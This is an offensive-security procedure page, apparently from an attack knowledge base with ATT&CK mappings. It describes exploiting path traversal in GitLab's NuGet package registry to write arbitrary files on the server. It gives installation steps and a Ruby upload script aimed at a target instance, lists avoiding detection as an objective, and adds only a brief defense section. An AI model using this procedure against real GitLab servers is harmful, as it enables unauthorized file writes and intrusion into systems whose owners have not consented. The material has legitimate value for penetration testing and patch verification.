---
tags:
  - path-traversal
  - nuget
  - upload
type: procedure
tools:
  - '[[tools/Faraday-Ruby-HTTP-Client]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/gem-install-faraday]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:27.678Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 3c957ae2-33ce-4336-9426-1116382772aa
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Upload-Malicious-NuGet-Package-to-GitLab-Registry

## Summary

This procedure uploads a crafted .nupkg file to GitLab's NuGet registry endpoint, triggering path traversal during metadata extraction to create arbitrary files on the server filesystem.

## Description

The update_package_from_metadata_service.rb in GitLab extracts and concatenates XML fields without validation, allowing the payload to write nyangawa.nupkg in traversed paths (e.g., root). Targets authenticated API access to /api/v4/projects/#{id}/packages/nuget/ on GitLab 12.8.7-ee. Prerequisites include a valid project ID and token; outcomes enable filesystem manipulation as git user.

## Requirements

1. Valid GitLab authentication token and project ID
2. Network access to GitLab instance
3. Prepared dummy.nupkg from prior procedure

## Defense

Defensive measures and detection strategies:

- Implement path normalization and canonicalization checks
- Log all package uploads with metadata details
- Use WAF rules to block traversal patterns in uploads

## Objectives

1. Successfully upload package without rejection
2. Trigger file creation in unintended location
3. Confirm no immediate detection

## Instructions

### Step 1: Install Faraday Gem

**Context**: Set up HTTP client for API upload.

**Command** ([[commands/gem-install-faraday]]):
```bash
gem install faraday
```

> Installs Faraday. Expected output: Successful gem installation.

### Step 2: Prepare Upload Script

**Context**: Script the PUT request with the malicious package.

**Command** (Ruby script creation):
```bash
cat > upload.rb << EOF
require 'faraday'
conn = Faraday.new(url: 'https://target-gitlab.com') do |f|
  f.basic_auth('username', 'token')
end
response = conn.put("/api/v4/projects/#{project_id}/packages/nuget/", File.read('dummy.nupkg'), {'Content-Type' => 'application/octet-stream'})
puts response.status
EOF
```

> Creates script. Expected output: File upload.rb ready.

### Step 3: Execute Upload

**Context**: Send the request to exploit extraction.

**Command** (Run script):
```bash
ruby upload.rb
```

> Triggers the vuln. Expected output: 200 OK; file created via traversal.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/gem-install-faraday]]

## Tools Used

- [[tools/Faraday-Ruby-HTTP-Client]]

## Tags

- path-traversal
- nuget
- api-upload
